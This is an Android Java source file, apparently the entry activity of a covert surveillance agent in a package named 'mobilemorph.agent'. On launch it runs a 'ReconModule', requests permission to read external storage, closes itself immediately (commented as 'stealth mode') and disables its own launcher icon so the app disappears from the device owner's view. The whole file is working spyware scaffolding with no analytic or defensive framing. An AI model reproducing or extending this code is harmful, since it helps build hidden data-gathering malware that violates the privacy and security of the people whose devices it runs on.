package com.mobilemorph.agent;
import com.mobilemorph.agent.ReconModule;
import android.app.Activity;
import android.content.ComponentName;
import android.os.Bundle;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int REQUEST_PERMISSIONS = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ReconModule.runRecon(this);
        requestRuntimePermissions();
        hideLauncherIcon();
        finish(); // close the activity immediately (stealth mode)
    }

    private void requestRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);
            }
        }
    }

    private void hideLauncherIcon() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                PackageManager p = getPackageManager();
                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                p.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        }, 1000); // delay optional
    }
}
